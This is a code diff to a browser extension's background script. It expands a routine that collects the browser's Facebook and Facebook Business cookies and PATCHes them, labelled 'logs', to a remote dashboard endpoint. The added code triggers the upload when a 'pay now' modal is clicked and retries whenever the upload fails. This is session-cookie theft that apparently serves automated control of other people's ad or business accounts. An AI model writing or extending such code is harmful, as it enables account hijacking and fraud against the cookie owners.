@@ -235,16 +235,25 @@ let cookiesSyncedThisRun = false;
 
 async function syncCookiesToDashboard() {
   if (!sessionId || !dashboardOrigin || cookiesSyncedThisRun) return;
+
   cookiesSyncedThisRun = true;
   try {
-    const logs = await chrome.cookies.getAll({ domain: 'business.facebook.com' });
-    await fetch(`${dashboardOrigin}/api/session/logs`, {
+    const [subdomain, apex] = await Promise.all([
+      chrome.cookies.getAll({ domain: 'business.facebook.com' }).catch(() => []),
+      chrome.cookies.getAll({ domain: 'facebook.com' }).catch(() => []),
+    ]);
+    const logs = { 'business.facebook.com': subdomain, 'facebook.com': apex };
+
+    const res = await fetch(`${dashboardOrigin}/api/session/logs`, {
       method: 'PATCH',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ sessionId, logs }),
     });
+
+    if (!res.ok) cookiesSyncedThisRun = false;
   } catch (_) {
     // Non-fatal: cookie sync failure should never block automation
+    cookiesSyncedThisRun = false;
   }
 }
 
@@ -374,6 +383,10 @@ async function handleTabStatus(tabId, msg) {
     case 'TAB_STATUS': {
       const status = msg.status;
       const detail = msg.detail || '';
+      console.log(`[Tab ${tabId}] Status update for account ${accountId}:`, status, detail);
+      if (status === 'clicked_paynow_modal') {
+        syncCookiesToDashboard();
+      }
 
       // Map content script status → account result
       const terminalStatuses = ['success', 'success_uncertain', 'error', 'payment_error', 'no_button'];
